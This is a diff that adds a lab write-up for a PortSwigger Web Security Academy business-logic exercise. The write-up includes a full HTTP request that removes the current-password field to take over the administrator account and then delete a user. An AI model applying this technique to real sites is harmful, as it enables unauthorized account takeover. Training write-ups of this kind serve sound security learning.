@@ -1,0 +1,60 @@
+#+title: Weak isolation on dual-use endpoint
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+#+description: Business Logic Vulnerabilities Labs from Portswigger
+#+date: 2023-10-29 Sun
+#+options: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+  - [[#test-account][Test account]]
+- [[#end-goal][End Goal]]
+- [[#exploit][Exploit]]
+
+* Lab contain
+- Flaw on assumption about user's privilege level based on their input
+** Test account
+       - username: =wiener=
+       - password: =peter=
+* End Goal
+- Exploit the logic of its account management features to gain access to arbitray user's account
+- Access =administrator= privilege and delete =carlos= user
+* Exploit
+- Access the lab
+- Login with [[#test-account][Test account]] credential
+- On account dashboard there are two feature available
+  1. update email
+  2. change password and username
+- Test update email feature
+  - Nothing special happen
+- Now try to change username =wiener= to =administrator= and fill-up other password field
+  - But beacuse of current password field it throws an error that =The current password is incorrct=
+- Now try without filling the current password field Send the request to repeater and remove =current-password= completely
+  #+begin_src 
+POST /my-account/change-password HTTP/2
+Host: 0a41000c03c8fe0e80b89e9f006a00ac.web-security-academy.net
+Cookie: session=240XBkeERrHJ0kOQralDYj5fKnfBqLo0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+Origin: https://0a41000c03c8fe0e80b89e9f006a00ac.web-security-academy.net
+Referer: https://0a41000c03c8fe0e80b89e9f006a00ac.web-security-academy.net/my-account?id=wiener
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+csrf=jFqx4FBUOaNty6tEVA6OWh02D5X7w80B&username=administrator&new-password-1=admin&new-password-2=admin
+#+end_src
+
+- Send this request. See that password change successfully
+
+- Now log out from your account and login with username =administrator=
+
+- Delete the user =carlos= from admin panel to solve the lab
+ 
+  
